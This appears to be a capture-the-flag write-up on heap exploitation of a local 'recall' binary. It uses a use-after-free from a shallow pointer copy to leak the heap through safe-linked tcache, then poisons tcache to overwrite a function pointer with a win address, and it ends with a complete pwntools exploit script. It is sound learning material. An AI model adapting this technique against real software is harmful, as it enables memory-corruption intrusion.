---
title: "Tcache Poisoning: Heap Leak to Function Pointer Overwrite"
---

## Overview
The goal is to exploit a Use-After-Free (UAF) to call a function within the program.

I started this challenge because I'm moving into heap exploit development. After learning about chunk overwrites, tcache mitigations, and why the allocator reaches for tcache first, a tcache poisoning challenge would be great to learn from and teach me through practical experience.

#### Mitigations
```
Arch:       amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
Debuginfo:  Yes
```
- **ASLR** is enabled on the system.

---
## Vulnerability
This program is just a "record" manager. You can store records, retrieve, copy, delete, etc.
```
== recall ==
 1. store
 2. update
 3. fetch
 4. drop
 5. copy
 0. quit
> 
```

When there is a program like this that heavily interacts with memory and has lots of possibilities for the user to influence the data, it is almost always vulnerable in someway. In this case, it was through the `copy` and `fetch` functionalities.

Here is a picture of the storing functionality, where the user data gets allocated onto the heap:

![store decomp photo](/assets/images/tcache-poisoning-leak-overwrite/allocate.png)

And here is a picture of the `copy` functionality, with the `table` array below:

![copy decomp photo](/assets/images/tcache-poisoning-leak-overwrite/vuln.png)

![table decomp photo](/assets/images/tcache-poisoning-leak-overwrite/table.png)


This took me some time to figure out, since I don't have much experience with logic bugs. Going line by line and keeping runtime behavior in mind, I noticed that `store` allocates the record on the heap, but `copy` duplicates the pointer into a global table, which is a "Shallow Copy".

So if we create a record (slot 0), copy it (slot 1), free the original (slot 0), then fetch the copy (slot 1), we get a Use-After-Free. The copy still points at a freed chunk.

---
## Stage 1 - Leak the Heap
If we free a record then read from it via the copy, it will output a heap memory address because the mangled `fd` is the only thing there now since the original record was deleted. But the copy still holds the pointer to that location.

Create a record with a big enough size to output a usable memory address, copy it, free the record, then fetch the copy

```python
store(0, 1, 16, b"999", b"A" * 16)
copy(0)
store(2, 1, 16, b"999", b"B" * 16)
copy(2)
drop(0) # Setting the tcache count to 1 chunk
leak = fetch(1).split()
raw  = u64(bytes.fromhex(b"".join(leak[:8]).decode()))
base = raw << 12 # Re-calculating the base address. Needed due to Safe-Linking
```

This may seem simple, but there's a prerequisite that stumped me at first. The bin must contain exactly one chunk. This is because its safe-linked forward pointer is `PROTECT(pos, NULL)`, and this is required because the chunk's forward pointer is NULL, `PROTECT` leaves just `pos >> 12`, which is the heap page base. If it wasn't then it would just point to another valid heap chunk, therefore incorrectly getting the heap base. In the code above, remember that `copy` won't contribute to the count, because it is a global array.

---
## Stage 2 - Poisoning
Now we raise the count to 2 and poison the head chunk's forward pointer. The count needs to be 2 because the head needs another chunk to actually link to.

The term "head" will change per `free()`. Tcache is LIFO (Last In, First Out) and behaves like the stack, meaning that if you were to call `free()`, and allocate again for the same size, that same freed chunk is coming right back out.

```python
table  = 0x4040a0
win    = 0x4014b3
target = table + 1 * 0x40

drop(2)
update(3, p64(target ^ raw) + p64(0))
```

`table` variable is a global array that stores the copies. In this case, we are using it to gain code execution. This is because one of its fields holds a function pointer, which is the most convenient way of redirecting execution. 

This code is in the storing functionality:
```c
int64_t (* rax_21)(struct record* r)

if (rax_1 == 0)
    rax_21 = view_text
else
    rax_21 = view_bytes

table[sx.q(result)].view = rax_21
```
- If you refer to the previous image of the `table` array, you will notice that `view` is the very first element. This means that you only have to overwrite the first 8 bytes of a table entry with a function address, and then get that function called.


Moving on, `drop(2)` is setting the tcache count to 2 so the forward pointer actually means something, and the `update` is updating the freed record, but through the copy. It is adding the address to the table entry that holds the function pointer and remangling the forward pointer with the leak.

---
## Stage 3 - Trigger
This next stage will be updating the chunk that was edited above. Because everything we did above was modifying a chunk to point at the table entry. So when we allocate, we are getting a chunk but it will be pointing at the address of the table entry that we gave, and all of our data we supply will be going into there.

```python
store(4, 1, 16, b"999", b"C" * 16) # head now points to target
store(5, 1, 8,  b"999", p64(win)) # tcache returns target. Overwriting the function pointer with win
```

Now the code that triggers the function to actually be called. `fetch` is the easiest way to trigger it (Due to it calling `view`):
```python
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'): ', b'1') # Fetch slot 1 which invokes table[1].view() = win
p.interactive()
```

---
## Final Exploit
```python
from pwn import *

context.binary = "./recall"
context.terminal = ["gnome-terminal", "--"]
context.log_level = "info"

GDBSCRIPT = """
b *op_store
c
"""

p = process("./recall")
if args.GDB:
    gdb.attach(p, gdbscript=GDBSCRIPT)

# Helpers
def store(slot, kind, length, key, value):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'): ', str(slot).encode())
    p.sendlineafter(b'bytes): ', str(kind).encode())
    p.sendlineafter(b'): ', str(length).encode())
    p.sendafter(b'key: ', key + b'\n')
    p.sendafter(b'bytes): ', value)
    p.recvuntil(b'stored in slot ')
    return int(p.recvline().strip())

def update(slot, value):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'): ', str(slot).encode())
    p.sendafter(b'bytes): ', value)
    p.recvuntil(b'updated')

def fetch(slot):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'): ', str(slot).encode())
    p.recvuntil(b'value:')
    return p.recvline()

def drop(slot):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'): ', str(slot).encode())
    p.recvuntil(b'dropped slot ')

def copy(src):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'): ', str(src).encode())
    p.recvuntil(b'-> slot ')
    return int(p.recvline().strip())

# Stage 1 - Leak the heap
store(0, 1, 16, b"999", b"A" * 16)
copy(0)
store(2, 1, 16, b"999", b"B" * 16)
copy(2)

drop(0) # Setting the tcache count to 1 chunk
leak = fetch(1).split()
raw  = u64(bytes.fromhex(b"".join(leak[:8]).decode()))
base = raw << 12 # Re-calculating the base address. Needed due to Safe-Linking

log.success("heap page base: " + hex(base))
log.success("mangle key    : " + hex(raw))

# Stage 2 - Poison
table  = 0x4040a0
win    = 0x4014b3
target = table + 1 * 0x40

drop(2)
update(3, p64(target ^ raw) + p64(0))

# Stage 3 - Trigger
store(4, 1, 16, b"999", b"C" * 16) # head now reveals to target
store(5, 1, 8,  b"999", p64(win)) # tcache returns target. Overwriting the function pointer with win

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'): ', b'1')
log.success("popping shell...")
p.interactive()
```